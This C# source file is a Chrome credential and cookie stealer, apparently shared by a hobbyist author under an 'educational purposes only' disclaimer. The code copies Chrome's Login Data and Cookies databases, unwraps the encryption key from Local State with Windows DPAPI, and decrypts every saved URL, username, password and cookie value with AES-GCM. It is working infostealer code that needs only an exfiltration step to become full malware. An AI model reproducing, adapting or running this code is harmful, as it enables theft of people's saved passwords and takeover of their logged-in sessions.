﻿/* Decrypts Chrome V80 and above password and cookies. 
*  but currently displays in console
*  Written By Dextertech
*  Twitter: DextertechV
*  Discord: DexterTech111#7106

	Although not well documented as there was no demand for this project
	and i was in a hurry. download visual studio, open solution and enjoy!
	
	Disclaimer: this code is for educational purposes only and i will not
	be held liable for any misuse of this code.
*/
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Data.SQLite;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto;
using System.Linq;

namespace Eragon
{
    class Chrome
    {
        //decrypt cookies using AES
        public string _decryptWithKey(byte[] message, byte[] key, int nonSecretPayloadLength)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException(String.Format("Key needs to be {0} bit!", KEY_BIT_SIZE), "key");
            if (message == null || message.Length == 0)
                throw new ArgumentException("Message required!", "message");

            using (var cipherStream = new MemoryStream(message))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(message.Length);
                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                    cipher.DoFinal(plainText, len);
                }
                catch (InvalidCipherTextException)
                {
                    return null;
                }
                return Encoding.Default.GetString(plainText);
            }
        }




        // Get chrome bytes 
        public  byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }

        public string GetChromePass()
        {
            string chrompass = string.Empty;
            string chromecookies = string.Empty;

            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string pathcookies = @"Google\Chrome\User Data\Default\Cookies";
            string path = @"Google\\Chrome\\User Data\\Default\\Login Data";
            path = Path.Combine(local, path);
            pathcookies = Path.Combine(local, pathcookies);
            //Console.WriteLine("Before======================");
            if (File.Exists(path))
            {
                // Console.WriteLine("after======================");

                Random random = new Random();

                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                string tempfile1 = new string(Enumerable.Repeat(chars, 4).Select(s => s[random.Next(s.Length)]).ToArray());
                string tempFile = tempfile1 + Path.GetTempFileName();
                File.Copy(path, tempfile1);
                string path1 = Path.Combine(local, @"Google\Chrome\User Data\Local State");
                if (File.Exists(path1))
                {
                    string encKey = File.ReadAllText(local + @"\Google\Chrome\User Data\Local State");
                    encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString();
                    var decodedKey = ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
                    using (var conn = new SQLiteConnection($"Data Source={tempfile1};"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                            using (var reader = cmd.ExecuteReader())
                            {

                                if (reader.HasRows)
                                {
                                    chrompass += "============CHROME PASSWORDS============\n";
                                    while (reader.Read())
                                    {
                                        var encpass = GetBytes(reader, 2);

                                        //  var pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));

                                        chrompass += "\nUrl : " + reader.GetString(0) + "\n" + "Username : " + reader.GetString(1) + "\n" + "Password : " + _decryptWithKey(encpass, decodedKey, 3) + "\n=====================================================";

                                    }
                                  //  Console.Write(chrompass);

                                }
                            }
                        }
                        conn.Close();
                        try
                        {
                            File.Delete(tempfile1);
                        }
                        catch
                        {
                            Console.WriteLine("could not delete");
                            // Well.. don't know what happened here and I don't care..
                            // Some tweaking tools will clean this folder at some point..
                        }

                    }



                    //Cookies section
                    string tempfile2 = new string(Enumerable.Repeat(chars, 4).Select(s => s[random.Next(s.Length)]).ToArray());
                    // string tempFile = tempfile1 + Path.GetTempFileName();
                    File.Copy(pathcookies, tempfile2);
                    using (var conn = new SQLiteConnection($"Data Source={tempfile2};"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            cmd.CommandText = "SELECT encrypted_value, name, host_key, path FROM cookies";
                            using (var reader = cmd.ExecuteReader())
                            {

                                if (reader.HasRows)
                                {
                                    //Console.Write(reader);
                                    chrompass += "\n============CHROME Cookies============\n";
                                    while (reader.Read())
                                    {
                                        var encpass = GetBytes(reader, 0);
                                        chromecookies += "\nUrl : " + reader.GetString(2) + "\n" + "Cookie : " + reader.GetString(1) + " : " + _decryptWithKey(encpass, decodedKey, 3) + "\n==========================================================";

                                    }

                                    // Console.Write(chromecookies);

                                   

                                }
                            }
                        }
                        conn.Close();
                        try
                        {
                            File.Delete(tempfile1);
                        }
                        catch
                        {
                            Console.WriteLine("could not delete");
                            // Well.. don't know what happened here and I don't care..
                            // Some tweaking tools will clean this folder at some point..
                        }

                    }




                    // Console.WriteLine("Hello World!");
                }

            }
            return chrompass + chromecookies;
        }
    }
}
